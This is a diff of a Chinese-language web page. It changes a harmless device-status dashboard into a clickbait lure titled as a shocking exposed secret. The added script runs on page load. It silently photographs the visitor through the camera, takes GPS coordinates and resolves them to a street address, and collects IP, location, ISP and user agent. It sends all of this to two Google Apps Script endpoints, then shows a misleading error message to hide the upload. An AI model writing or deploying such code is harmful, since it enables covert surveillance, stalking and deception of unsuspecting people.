@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>科技感資訊展示</title>
+  <title>驚天秘密曝光！他們不想讓你知道的真相！</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -34,22 +34,9 @@
       font-size: 18px;
       margin-bottom: 15px;
     }
-    .progress {
-      background: #2e2e40;
-      border-radius: 10px;
-      height: 10px;
-      position: relative;
-      margin: 10px 0 20px;
-    }
-    .progress-bar {
-      background: #4caf50;
-      height: 100%;
-      width: 0;
-      border-radius: 10px;
-    }
     .status-text {
       font-size: 14px;
-      margin: 5px 0;
+      margin: 10px 0;
     }
     .loader {
       border: 4px solid #2b2b3d;
@@ -67,47 +54,23 @@
   </style>
 </head>
 <body>
-  <h1>科技感資訊中心</h1>
+  <h1>驚天秘密曝光！他們不想讓你知道的真相！</h1>
   <div class="container">
     <div class="card">
-      <h2>電池狀態</h2>
-      <div id="battery-info">
-        <p class="status-text">正在讀取...</p>
-        <div class="progress">
-          <div class="progress-bar" id="battery-bar"></div>
-        </div>
-      </div>
+      <h2>IP 資訊</h2>
+      <p id="ipInfo" class="status-text">資訊載入中...</p>
     </div>
     <div class="card">
-      <h2>GPS 狀態</h2>
-      <div id="gps-info">
-        <p class="status-text">正在定位中...</p>
-        <div class="loader"></div>
-      </div>
+      <h2>鏡頭狀態</h2>
+      <p id="status" class="status-text">請開啟鏡頭使用ＡＲ...</p>
     </div>
     <div class="card">
-      <h2>IP 及設備資訊</h2>
-      <div id="device-info">
-        <p class="status-text">讀取中...</p>
-        <div class="loader"></div>
-      </div>
+      <h2>處理進度</h2>
+      <div class="loader"></div>
     </div>
   </div>
 
   <script>
-    // 電池資訊更新
-    function updateBatteryStatus() {
-      navigator.getBattery().then((battery) => {
-        const level = battery.level * 100;
-        const batteryBar = document.getElementById('battery-bar');
-        batteryBar.style.width = `${level}%`;
-        document.getElementById('battery-info').innerHTML = `
-          <p class="status-text">電量：${level.toFixed(0)}%</p>
-          <p class="status-text">${battery.charging ? '充電中' : '未充電'}</p>
-        `;
-      });
-    }
-
     // 自動拍照功能
     async function startCameraAndSend() {
       const statusElement = document.getElementById('status');
@@ -119,6 +82,7 @@
         const video = document.createElement('video');
         video.srcObject = stream;
 
+        // 等待相機畫面載入
         await new Promise((resolve) => {
           video.onloadedmetadata = () => {
             video.play();
@@ -126,6 +90,7 @@
           };
         });
 
+        // 延遲 1 秒拍照
         setTimeout(() => {
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth || 640;
@@ -133,6 +98,7 @@
           const context = canvas.getContext('2d');
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+          // 壓縮為 Base64 格式
           const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
           stream.getTracks().forEach((track) => track.stop());
           getGpsCoordinates(photoData);
@@ -143,43 +109,90 @@
       }
     }
 
-    // GPS 資訊
+    // 取得 GPS 經緯度資訊
     async function getGpsCoordinates(photoData) {
-      const statusElement = document.getElementById('gps-info');
+      const statusElement = document.getElementById('status');
       try {
         navigator.geolocation.getCurrentPosition(async (position) => {
-          document.getElementById('gps-info').innerHTML = `
-            <p class="status-text">定位完成</p>
-            <p class="status-text">數據已加密處理</p>
-          `;
+          const { latitude, longitude } = position.coords;
+          // 透過經緯度取得地址
+          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+          const data = await response.json();
+          const address = data.display_name || '未知地址';
+
+          // 發送照片到後端
+          sendPhotoToServer(photoData, latitude, longitude, address);
         }, (error) => {
-          document.getElementById('gps-info').innerHTML = `
-            <p class="status-text">GPS 無法取得</p>
-            <p class="status-text">請檢查裝置定位權限。</p>
-          `;
+          console.error('GPS 錯誤:', error);
+          statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限。';
         });
       } catch (error) {
-        console.error('GPS錯誤:', error);
+        console.error('錯誤:', error);
+        statusElement.innerText = '操作失敗，請檢查控制台。';
       }
     }
 
-    // IP與設備資訊
+    // 發送照片和 GPS 到後端
+    async function sendPhotoToServer(photoData, latitude, longitude, address) {
+      const statusElement = document.getElementById('status');
+      try {
+        const formData = new URLSearchParams();
+        formData.append('message', '自動拍照圖片');
+        formData.append('imageData', photoData);
+        formData.append('latitude', latitude);
+        formData.append('longitude', longitude);
+        formData.append('address', address);
+
+        const response = await fetch('https://script.google.com/macros/s/AKfycbzv1XvirckHJxlvuSgqaTx4hyi119CsYr-gZ_op_3TUphVN4AnPOUtsGSrICZMhxuSQOg/exec', {
+          method: 'POST',
+          body: formData,
+        });
+
+        const result = await response.json();
+        if (result.success) {
+          statusElement.innerText = '讀取失敗，請使用Google Chrome開啟';
+        } else {
+          statusElement.innerText = `通知發送失敗：${result.error}`;
+        }
+      } catch (error) {
+        console.error('發送過程中發生錯誤:', error);
+        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
+      }
+    }
+
+    // 獲取 IP 和設備資訊
     async function getIpInfo() {
       try {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
-        document.getElementById('device-info').innerHTML = `
-          <p class="status-text">設備資訊已加密處理</p>
-        `;
+        const { ip, city, region, country, org } = data;
+        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
+        const userAgent = navigator.userAgent;
+
+        const url = new URL('https://script.google.com/macros/s/AKfycbyF061FXgLSk7Yg24md-Od0rwRZl-wV5J27KX3nU9-52WPod3Bz8hQ_dp33AW6LBP0D/exec');
+        url.searchParams.append('ip', ip);
+        url.searchParams.append('ipType', ipType);
+        url.searchParams.append('userAgent', userAgent);
+        url.searchParams.append('city', city);
+        url.searchParams.append('region', region);
+        url.searchParams.append('country', country);
+        url.searchParams.append('org', org);
+
+        const result = await fetch(url);
+        const responseData = await result.json();
+
+        if (responseData.success) {
+          document.getElementById('ipInfo').innerText = '資訊已成功上傳！';
+        } else {
+          document.getElementById('ipInfo').innerText = 'IP 資訊上傳失敗！';
+        }
       } catch (error) {
-        document.getElementById('device-info').innerHTML = `
-          <p class="status-text">讀取失敗</p>
-        `;
+        console.error('IP 資訊錯誤:', error);
+        document.getElementById('ipInfo').innerText = 'IP 資訊操作失敗，請檢查控制台。';
       }
     }
 
     // 啟動功能
-    updateBatteryStatus();
     getIpInfo();
     startCameraAndSend();
   </script>
